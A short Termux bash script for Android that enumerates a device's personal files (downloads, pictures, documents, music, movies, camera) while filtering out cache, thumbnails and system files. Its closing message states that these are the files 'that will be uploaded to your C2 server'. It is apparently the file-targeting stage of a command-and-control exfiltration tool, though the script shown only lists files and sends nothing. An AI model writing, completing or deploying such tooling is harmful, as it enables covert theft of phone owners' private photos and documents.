#!/data/data/com.termux/files/usr/bin/bash

echo "🔍 Checking Real User Files (Excluding System Files)"
echo "=================================================="

STORAGE_DIR="$HOME/storage"
ANDROID_STORAGE="/storage/emulated/0"

echo "📁 Checking storage directories..."
echo ""

# Function to scan directory for real files
scan_directory() {
    local dir_path="$1"
    local dir_name="$2"
    
    if [ ! -d "$dir_path" ] || [ ! -r "$dir_path" ]; then
        echo "❌ $dir_name: Cannot access"
        return
    fi
    
    echo "📂 $dir_name:"
    
    # Find real files (excluding thumbnails, hidden, cache, etc.)
    local real_files=$(find "$dir_path" -type f -readable \
        ! -path "*/\.*" \
        ! -path "*/.thumbnails/*" \
        ! -path "*/thumbnails/*" \
        ! -name ".*" \
        ! -name "*.tmp" \
        ! -name "*.cache" \
        ! -name "*.thumb" \
        ! -name "*.db" \
        ! -name "*.log" \
        2>/dev/null | head -20)
    
    local file_count=$(echo "$real_files" | wc -l)
    
    if [ "$file_count" -eq 0 ]; then
        echo "  📄 No real files found"
        return
    fi
    
    echo "  📄 Found $file_count real files:"
    
    # Show file details
    echo "$real_files" | while read file; do
        if [ -n "$file" ]; then
            local filename=$(basename "$file")
            local size=$(stat -c %s "$file" 2>/dev/null || echo "0")
            local size_kb=$((size / 1024))
            local extension="${file##*.}"
            
            if [ "$size_kb" -gt 1024 ]; then
                local size_mb=$((size_kb / 1024))
                echo "    📄 $filename (${size_mb}MB, .${extension})"
            else
                echo "    📄 $filename (${size_kb}KB, .${extension})"
            fi
        fi
    done
}

# Check each directory
for subdir in downloads pictures documents music movies dcim; do
    # Try Android storage first
    android_path="$ANDROID_STORAGE/$subdir"
    if [ -d "$android_path" ]; then
        scan_directory "$android_path" "$subdir (Android)"
    else
        # Fallback to symlinked path
        symlink_path="$STORAGE_DIR/$subdir"
        scan_directory "$symlink_path" "$subdir (Symlink)"
    fi
    echo ""
done

echo "💡 This shows only REAL user files (no thumbnails, cache, or system files)"
echo "💡 These are the files that will be uploaded to your C2 server"
